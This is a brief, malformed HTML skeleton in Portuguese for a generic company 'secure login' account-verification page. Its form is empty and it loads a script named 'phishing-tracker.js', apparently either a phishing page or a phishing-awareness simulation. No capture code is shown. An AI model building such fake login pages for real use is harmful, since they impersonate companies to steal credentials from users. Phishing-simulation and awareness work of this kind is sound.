<!DOCTYPE html>
<html lang="pt-BR">
<head>

    <title>Sua Empresa - Login Seguro</title>

<body>

        <form id="loginForm">
            <h1>Verificação de Conta</h1>

        </form>
    </div>

    <script src="phishing-tracker.js"></script>
